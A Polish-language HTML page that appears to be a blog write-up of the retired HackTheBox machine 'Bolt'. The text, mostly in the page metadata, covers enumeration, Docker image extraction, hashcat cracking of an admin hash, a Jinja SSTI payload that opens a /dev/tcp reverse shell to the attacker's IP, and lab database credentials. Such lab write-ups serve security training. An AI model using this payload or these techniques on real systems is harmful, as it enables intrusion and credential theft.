<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Bolt - HackTheBox | Lavatann</title>
<meta name="keywords" content="Linux, Medium, Retired" />
<meta name="description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)">
<meta name="author" content="Mateusz Suszczyk">
<link rel="canonical" href="https://lavatann.github.io/posts/hackthebox/bolt/" />
<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://lavatann.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://lavatann.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://lavatann.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://lavatann.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://lavatann.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.92.2" />
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Bolt - HackTheBox" />
<meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/bolt/" />
<meta property="og:image" content="https://lavatann.github.io/thumbnails/Bolt.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-02-09T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-02-09T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Bolt.jpg" />
<meta name="twitter:title" content="Bolt - HackTheBox"/>
<meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://lavatann.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Bolt - HackTheBox",
      "item": "https://lavatann.github.io/posts/hackthebox/bolt/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Bolt - HackTheBox",
  "name": "Bolt - HackTheBox",
  "description": "Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup\u0026rsquo;em :)",
  "keywords": [
    "Linux", "Medium", "Retired"
  ],
  "articleBody": "Bolt - 18.02.2022  NMap ┌─[eu-free-3]─[10.10.15.13]─[parrot@parrot]─[~/htb/bolt] └──╼ [★ ]$ sudo nmap -sC -sV -p 22,80,443 10.10.11.114 [sudo] password for parrot: Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-18 16:43 CET Nmap scan report for passbolt.bolt.htb (10.10.11.114) Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Starter Website - About |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 |_ssl-date: TLS randomness does not represent time |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  GoBuster - subdomeny ┌─[eu-free-3]─[10.10.15.13]─[parrot@parrot]─[~/htb/bolt] └──╼ [★ ]$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bolt.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/19 18:19:18 Starting gobuster in VHOST enumeration mode =============================================================== Found: mail.bolt.htb (Status: 200) [Size: 4943] Found: demo.bolt.htb (Status: 302) [Size: 219] =============================================================== 2022/02/19 18:19:55 Finished =============================================================== Zatem dodaję do /etc/hosts wpis 10.10.11.114\tpassbolt.bolt.htb bolt.htb demo.bolt.htb mail.bolt.htb.\n Nikto  Strona główna  Port 443 Mamy logowanie\nmail.bolt.htb demo.bolt.htb Co ciekawe z obu stron (bolt.htb, passbolt.bolt.htb) można pobrać obraz Dockera image.tar. Sprawdziłem oba pobrane obrazy md5sum. Są takie same.\nZawartość archiwum:\n┌─[eu-free-3]─[10.10.15.13]─[parrot@parrot]─[~/htb/bolt] └──╼ [★ ]$ ls -al total 12 drwxr-xr-x 1 parrot parrot 1610 lut 19 19:22 . drwxr-xr-x 1 parrot parrot 1008 lut 19 19:22 .. drwxr-xr-x 1 parrot parrot 40 mar 5 2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950 drwxr-xr-x 1 parrot parrot 40 mar 5 2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c drwxr-xr-x 1 parrot parrot 40 mar 5 2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa drwxr-xr-x 1 parrot parrot 40 mar 5 2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab drwxr-xr-x 1 parrot parrot 40 mar 5 2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162 drwxr-xr-x 1 parrot parrot 40 mar 5 2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b drwxr-xr-x 1 parrot parrot 40 mar 5 2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad drwxr-xr-x 1 parrot parrot 40 mar 5 2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf -rw-r--r-- 1 parrot parrot 3797 mar 5 2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json drwxr-xr-x 1 parrot parrot 40 mar 5 2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77 drwxr-xr-x 1 parrot parrot 40 mar 5 2021 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 drwxr-xr-x 1 parrot parrot 40 mar 5 2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26 -rw-r--r-- 1 parrot parrot 1002 sty 1 1970 manifest.json -rw-r--r-- 1 parrot parrot 119 sty 1 1970 repositories drwxr-xr-x 1 root root 10 lut 18 12:41 results Przejrzałem kilka tych folderów, każdy zawiera kolejny plik layer.tar. Zatem postanowiłem rozpakować też te wszystkie archiwa. Wykorzystałem polecenie\nfind . -type f -iname \"*.tar\" -print0 -execdir tar xf {} \\; -delete Teraz pierwszy folder wygląda tak\nPonieważ jest tego sporo, postanowiłem spróbować poszukać czegoś grepem.\nNo tylko tutaj grep niestety nie daje rady, za dużo jest tych podfolderów i za długo to trwa. Postanowiłem ograniczyć szukanie do 2 podfolderów i szukać jakichś maili, ponieważ mamy kilka formularzów do logowania z mailem.\n┌─[eu-free-3]─[10.10.15.13]─[parrot@parrot]─[~/htb/bolt/image] └──╼ [★ ]$ find . -maxdepth 2 -exec grep -as '@bolt.htb' {} \\; DEFAULT_MAIL_SENDER = 'support@bolt.htb' )Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.ex_User_1User ) admin@bolt.htb Dodałem opcje -H do grep, dzięki czemu widzę dokładnie, w którym pliku znalezioną daną frazę\n┌─[eu-free-3]─[10.10.15.13]─[parrot@parrot]─[~/htb/bolt/image] └──╼ [★ ]$ find . -maxdepth 2 -exec grep -Has '@bolt.htb' {} \\; ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py: DEFAULT_MAIL_SENDER = 'support@bolt.htb' )Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.27af2976f2/db.sqlite3:)';indexsqlite_autoindex_User_2User';indexsqlite_autoindex_User_1User ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3:) admin@bolt.htb  Potencjalnie ciekawe dane ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py\n# Set up the App SECRET_KEY  SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007') # This will create a file in  FOLDER  SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3') SQLALCHEMY_TRACK_MODIFICATIONS = False MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb' # PostgreSQL database SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format( config( 'DB_ENGINE' , default='postgresql' ), config( 'DB_USERNAME' , default='appseed' ), config( 'DB_PASS' , default='pass' ), config( 'DB_HOST' , default='localhost' ), config( 'DB_PORT' , default=5432 ), config( 'DB_NAME' , default='appseed-flask' ) ) ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3\nk9tableUserUserCREATE TABLE \"User\" ( id INTEGER NOT NULL, username VARCHAR, email VARCHAR, password BLOB, email_confirmed BOOLEAN, profile_update VARCHAR(80), PRIMARY KEY (id), UNIQUE (username), UNIQUE (email) )Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.ex_User_1User admin ) admin@bolt.htb Mamy hash $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q., sprawdziłem i jest to md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5).\nOdpaliłem hashcata i po chwili otrzymałem złamane hasło\nhashcat -a 0 -m 500 admin.hash /usr/share/wordlists/rockyou.txt $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt admin:deadbolt\nHasło zadziałało na subdomene bolt.htb.\nNatomiast nic ciekawego tutaj nie znalazłem. Postanowiłem poszukać jeszcze na pozostałych subdomenach. Na mail.bolt.htb na te dane logowania, odpowiedź jest nieco inna niż przy niepoprawnych danych.\nOtrzymujemy taką odpowiedź\nNormalnie, przy losowych danych komunikat to po prostu Login failed.\nSpróbowałem czegoś z BurpSuite, ale okazało się to błędnym tropem\n Ponowne wypakowanie Absolutnie utkwiłem w tym miejscu. Sprawdziłem metodologie IppSeca. Okazało się, rozwiązania trzeba szukać w rejestracji użytkowników i polu Invite code . Tylko że po części błędnie wypakowałem pliki layer.tar i należy to poprawić.\ncat manifest.json | jq .[].Layers  ../layers [ \"187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar\", \"745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar\", \"41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar\", \"d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar\", \"3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar\", \"9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar\", \"1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar\", \"a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar\", \"3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar\", \"2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar\", \"3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar\" ] Należy teraz to oczyścić. I zrobię to tak jak IppSec, po kolei rozpakuje kolejne tary do output.\nmkdir output cd output for i in $(cat layers); do tar -C output -xvf $i; done W ten sposób otrzymujemy składny system plików. Warto spojrzeć na nietypowy folder app.\nW folderze app mamy rozgałęzienie na home oraz base. Foldery różnią się od siebie. Mianowicie w podfolderze base znajdziemy informacje o rejestracji użytkowników.\nWykorzystując mój stary skrypt z wypakowaniem każdego layer.tar w danym folderze możemy znaleźć dodatkowy plik\nNo i w pliku ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py mamy dodatkową treść, której wcześniej nie widzieliśmy.\ncode = XNSS-HSJW-3NGU-8XTJ\n Nowy użytkownik Stworzyłem nowego użytkownika. Udało mi się zalogować tymi danymi logowania nie tylko na demo.bolt.htb, ale również na mail.bolt.htb. Podatny okazuje sie ten formularz\nGdy wpisałem losowe rzeczy, na subdomene z mailem przyszła wiadomość\nJak się okazuje, jest to podatność SSTI, ktorą można wykorzystać.\nTo jest akurat ciekawe, ponieważ całkowicie pominąłem nazwę Jinja w tytule stron\nA to potencjalnie też ważna informacja.\nNa PayloadAllTheThings można znaleźć najważniejsze informacje jak wykorzystać tą podatność.\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c \"/bin/bash -i \u0026 /dev/tcp/10.10.15.13/8000 0\u00261').read() }}  www-data Mamy na boxie dwóch użytkowników clark oraz eddie.\nLinPeas\n╔══════════╣ Analyzing Passbolt Files (limit 70) -rw-r----- 1 root www-data 3128 Feb 25 2021 /etc/passbolt/passbolt.php * Passbolt ~ Open source password manager for teams 'host' = 'localhost', 'port' = '3306', 'username' = 'passbolt', 'password' = 'rT2;jW7, 'database' = 'passboltdb', 'EmailTransport' = [ 'host' = 'localhost', 'port' = 587, 'username' = null, 'password' = null, 'from' = ['localhost@bolt.htb' = 'localhost'], passbolt:rT2;jW7\nmysql -u passbolt -p passboltdb\n Privilege Escalation ",
  "wordCount" : "1063",
  "inLanguage": "en",
  "image":"https://lavatann.github.io/thumbnails/Bolt.jpg","datePublished": "2021-02-09T00:00:00Z",
  "dateModified": "2021-02-09T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Mateusz Suszczyk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://lavatann.github.io/posts/hackthebox/bolt/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Lavatann",
    "logo": {
      "@type": "ImageObject",
      "url": "https://lavatann.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://lavatann.github.io" accesskey="h" title="Lavatann (Alt + H)">Lavatann</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://lavatann.github.io/archives/" title="Archiwum">
                    <span>Archiwum</span>
                </a>
            </li>
            <li>
                <a href="https://lavatann.github.io/categories/" title="Kategorie">
                    <span>Kategorie</span>
                </a>
            </li>
            <li>
                <a href="https://lavatann.github.io/tags/" title="Tagi">
                    <span>Tagi</span>
                </a>
            </li>
            <li>
                <a href="https://lavatann.github.io/search/" title="Szukaj">
                    <span>Szukaj</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://lavatann.github.io">Home</a>&nbsp;»&nbsp;<a href="https://lavatann.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Bolt - HackTheBox
    </h1>
    <div class="post-meta"><span title='2021-02-09 00:00:00 +0000 UTC'>February 9, 2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Mateusz Suszczyk

</div>
  </header> 
<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Bolt.jpg" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#bolt---18022022" aria-label="Bolt - 18.02.2022">Bolt - 18.02.2022</a></li>
                <li>
                    <a href="#nmap" aria-label="NMap">NMap</a></li>
                <li>
                    <a href="#gobuster---subdomeny" aria-label="GoBuster - subdomeny">GoBuster - subdomeny</a></li>
                <li>
                    <a href="#nikto" aria-label="Nikto">Nikto</a></li>
                <li>
                    <a href="#strona-g%c5%82%c3%b3wna" aria-label="Strona główna">Strona główna</a><ul>
                        
                <li>
                    <a href="#port-443" aria-label="Port 443">Port 443</a></li>
                <li>
                    <a href="#mailbolthtb" aria-label="mail.bolt.htb">mail.bolt.htb</a></li>
                <li>
                    <a href="#demobolthtb" aria-label="demo.bolt.htb">demo.bolt.htb</a><ul>
                        
                <li>
                    <a href="#potencjalnie-ciekawe-dane" aria-label="Potencjalnie ciekawe dane">Potencjalnie ciekawe dane</a></li>
                <li>
                    <a href="#ponowne-wypakowanie" aria-label="Ponowne wypakowanie">Ponowne wypakowanie</a></li>
                <li>
                    <a href="#nowy-u%c5%bcytkownik" aria-label="Nowy użytkownik">Nowy użytkownik</a></li>
                <li>
                    <a href="#www-data" aria-label="www-data">www-data</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="bolt---18022022">Bolt - 18.02.2022<a hidden class="anchor" aria-hidden="true" href="#bolt---18022022">#</a></h1>
<hr>
<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>eu-free-3<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>10.10.15.13<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/bolt<span style="color:#f92672">]</span>
└──╼ <span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$ sudo nmap -sC -sV -p 22,80,443 10.10.11.114
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> parrot: 
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-02-18 16:43 CET
Nmap scan report <span style="color:#66d9ef">for</span> passbolt.bolt.htb <span style="color:#f92672">(</span>10.10.11.114<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.061s latency<span style="color:#f92672">)</span>.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp  open  http     nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title:     Starter Website -  About 
|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
443/tcp open  ssl/http nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
| http-title: Passbolt | Open source password manager <span style="color:#66d9ef">for</span> teams
|_Requested resource was /auth/login?redirect<span style="color:#f92672">=</span>%2F
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>passbolt.bolt.htb/organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><hr>
<h1 id="gobuster---subdomeny">GoBuster - subdomeny<a hidden class="anchor" aria-hidden="true" href="#gobuster---subdomeny">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>eu-free-3<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>10.10.15.13<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/bolt<span style="color:#f92672">]</span>
└──╼ <span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb                                                               
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:          http://bolt.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:       GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:      <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:   gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:      10s
<span style="color:#f92672">===============================================================</span>
2022/02/19 18:19:18 Starting gobuster in VHOST enumeration mode
<span style="color:#f92672">===============================================================</span>
Found: mail.bolt.htb <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4943<span style="color:#f92672">]</span>
Found: demo.bolt.htb <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 219<span style="color:#f92672">]</span> 
                                               
<span style="color:#f92672">===============================================================</span>
2022/02/19 18:19:55 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Zatem dodaję do <code>/etc/hosts</code> wpis <code>10.10.11.114	passbolt.bolt.htb bolt.htb demo.bolt.htb mail.bolt.htb</code>.</p>
<hr>
<h1 id="nikto">Nikto<a hidden class="anchor" aria-hidden="true" href="#nikto">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
</code></pre></div><hr>
<h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
<hr>
<h2 id="port-443">Port 443<a hidden class="anchor" aria-hidden="true" href="#port-443">#</a></h2>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220218164807.png" alt=""  />
</p>
<p>Mamy logowanie</p>
<h2 id="mailbolthtb">mail.bolt.htb<a hidden class="anchor" aria-hidden="true" href="#mailbolthtb">#</a></h2>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220219182310.png" alt=""  />
</p>
<h2 id="demobolthtb">demo.bolt.htb<a hidden class="anchor" aria-hidden="true" href="#demobolthtb">#</a></h2>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220219182330.png" alt=""  />
</p>
<p>Co ciekawe z obu stron (<code>bolt.htb</code>, <code>passbolt.bolt.htb</code>) można pobrać obraz Dockera <code>image.tar</code>. Sprawdziłem oba pobrane obrazy <code>md5sum</code>. Są takie same.</p>
<p>Zawartość archiwum:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>eu-free-3<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>10.10.15.13<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/bolt<span style="color:#f92672">]</span>
└──╼ <span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$ ls -al
total <span style="color:#ae81ff">12</span>
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot <span style="color:#ae81ff">1610</span> lut <span style="color:#ae81ff">19</span> 19:22 .
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot <span style="color:#ae81ff">1008</span> lut <span style="color:#ae81ff">19</span> 19:22 ..
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
